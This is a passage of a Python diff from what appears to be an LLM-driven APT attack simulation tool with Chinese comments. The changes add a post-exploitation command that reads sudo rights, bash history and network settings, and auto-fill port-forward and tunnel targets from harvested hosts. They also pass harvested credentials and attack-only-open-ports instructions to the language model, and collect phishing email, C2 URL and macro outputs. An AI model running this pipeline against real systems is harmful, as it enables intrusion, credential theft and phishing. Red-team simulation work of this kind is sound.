                 _params["command"] = "id; echo '===UNAME==='; uname -a; echo '===SUDO==='; echo '' | sudo -S -l 2>&1 || true; echo '===HOME==='; ls -la ~ 2>/dev/null; echo '===HISTORY==='; cat ~/.bash_history 2>/dev/null | tail -20; echo '===NET==='; ip addr 2>/dev/null || ifconfig 2>/dev/null"
+                _params["timeout"] = 8  # 避免长阻塞
             # Auto-populate targets from harvested data for apt_port_forward
             if tool_name == "apt_port_forward":
+                harvested = state.notes.get("post_exploit", {}).get("harvested", {})
+                if harvested.get("hosts"):
+                    _params["remote_host"] = harvested["hosts"][0]
+                    _params["remote_port"] = 80
+                else:
+                    _params["remote_host"] = ""
+                    _params["remote_port"] = 0
+            if tool_name == "apt_tunnel_establish":
+                _params["timeout"] = 8
                 harvested = state.notes.get("post_exploit", {}).get("harvested", {})
                 if harvested.get("hosts"):
                     _params["remote_host"] = harvested["hosts"][0]
@@ -1708,6 +2738,9 @@ def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dic
             safe_print(f"  [{tool_name}] 错误: {_exc}")
 
     results["findings"] = _collect_findings(results)
+    # 注入当前凭证状态，防止 LLM 误判"不可达"
+    if has_creds and not results.get("credentials"):
+        results["credentials"] = creds
     return results
 
 
@@ -1863,6 +2896,25 @@ def _summarize_auto_results(raw: dict[str, Any], max_str_len: int = 300) -> dict
     return summary
 
 
+def _fallback_result(auto_results: dict[str, Any], notes: dict[str, Any]) -> dict[str, Any]:
+    """LLM 不可用时从自动工具结果构建降级 JSON"""
+    creds = notes.get("credentials") or auto_results.get("credentials") or {}
+    result: dict[str, Any] = {
+        "summary": auto_results.get("summary", "自动工具链执行完成"),
+        "findings": auto_results.get("findings", []),
+        "blue_team_awareness_delta": 0,
+    }
+    if creds and creds.get("username") and creds.get("password"):
+        result["credentials"] = creds
+        result["compromised"] = True
+    pe = auto_results.get("post_exploit")
+    if isinstance(pe, dict):
+        if not result.get("credentials") and pe.get("credentials"):
+            result["credentials"] = pe["credentials"]
+            result["compromised"] = True
+    return result
+
+
 def _execute_phase(
     state: AptSimulationState,
     phase: AptPhase,
@@ -1919,7 +2971,21 @@ def _execute_phase(
 
     # ── 所有阶段统一自动工具链执行（无 LLM 循环）──
     auto_results = _auto_execute_phase_tools(phase, state)
+    # 缓存扫描结果到 state.notes，避免后续阶段重复扫描
+    if phase == AptPhase.RECON and auto_results.get("scan_result"):
+        state.notes["scan_cache"] = auto_results["scan_result"]
+        state.notes["open_ports"] = auto_results.get("open_ports", [])
     auto_summary = _summarize_auto_results(auto_results)
+    # 注入缓存的扫描结果，避免 LLM 重复扫描
+    scan_cache = state.notes.get("scan_cache")
+    open_ports_note = state.notes.get("open_ports", [])
+    if scan_cache and open_ports_note:
+        port_list = [f"{p.get('port', '?')}/{p.get('name', 'unknown')}" for p in open_ports_note[:10]]
+        user_prompt += (
+            f"\n\n### 已缓存的端口扫描结果（来自 RECON 阶段，禁止重复扫描）\n"
+            f"开放端口: {', '.join(port_list)}\n"
+            f"⚠ 不要调用 apt_nmap_scan，端口扫描已完成。只在已知开放端口上执行攻击。\n"
+        )
     user_prompt += (
         "\n\n### 自动工具执行结果（全部工具已执行完毕，无需再调工具）\n"
         + json.dumps(_to_jsonable(auto_summary), ensure_ascii=False, indent=2)
@@ -1947,7 +3013,10 @@ def _execute_phase(
         responses = _future.result(timeout=300)
     except _cf.TimeoutError:
         safe_print(f"  [TIMEOUT] 阶段 {PHASE_LABELS.get(phase, phase.value)} 执行超时 (300s)")
-        return {"summary": "阶段执行超时", "findings": auto_results.get("findings", []), "blue_team_awareness_delta": 0}
+        return _fallback_result(auto_results, state.notes)
+    except Exception as _net_exc:
+        safe_print(f"  [NET-ERR] LLM 调用失败 (网络错误): {str(_net_exc)[:200]}")
+        return _fallback_result(auto_results, state.notes)
     finally:
         _executor.shutdown(wait=False)
 
@@ -1963,19 +3032,19 @@ def _execute_phase(
     if not _result:
         # ── JSON 恢复重试（1 次，无工具强制输出）──
         summary_context = final_text[:800] if final_text else "(无前文)"
-        _no_tool_asst = create_qwen_security_assistant(
-            system_message=system_prompt, mode="apt",
-            function_list=[], llm_cfg=build_qwen_llm_config(model=model, mode="apt"),
-        )
-        retry_msgs = [{"role": "user", "content": (
-            f"你之前执行了工具调用。以下是你最后的输出：\n---\n{summary_context}\n---\n"
-            f"请基于工具执行结果输出严格的 JSON 摘要，不要调用工具。"
-        )}]
         try:
+            _no_tool_asst = create_qwen_security_assistant(
+                system_message=system_prompt, mode="apt",
+                function_list=[], llm_cfg=build_qwen_llm_config(model=model, mode="apt"),
+            )
+            retry_msgs = [{"role": "user", "content": (
+                f"你之前执行了工具调用。以下是你最后的输出：\n---\n{summary_context}\n---\n"
+                f"请基于工具执行结果输出严格的 JSON 摘要，不要调用工具。"
+            )}]
             responses = _no_tool_asst.run_nonstream(retry_msgs)
             final_text = _collect_final_assistant_text(responses)
             _result = _extract_json_payload(final_text)
-        except SecurityAgentError:
+        except Exception:
             _result = {"summary": final_text[:500] if final_text else "无输出",
                        "findings": auto_results.get("findings", []),
                        "blue_team_awareness_delta": 0}
@@ -1999,5 +3068,17 @@ def _execute_phase(
 
     if _result.get("credentials"):
         _result["compromised"] = True
+
+    # ── 注入社工钓鱼阶段的详细数据（LLM 分析不包含这些工具输出）──
+    if phase == AptPhase.SOCIAL_ENG:
+        for _key in ("email_subject", "email_body", "attachment_name", "attachment_path",
+                     "c2_url", "macro_code", "email_path", "vba_path", "zip_path",
+                     "phishing_result", "macro_result"):
+            if _key in auto_results and _key not in _result:
+                _result[_key] = auto_results[_key]
+        _result.setdefault("findings", [])
+        _result["findings"] = list(dict.fromkeys(
+            (_result["findings"] or []) + auto_results.get("findings", [])[:5]
+        ))
 
     return _result
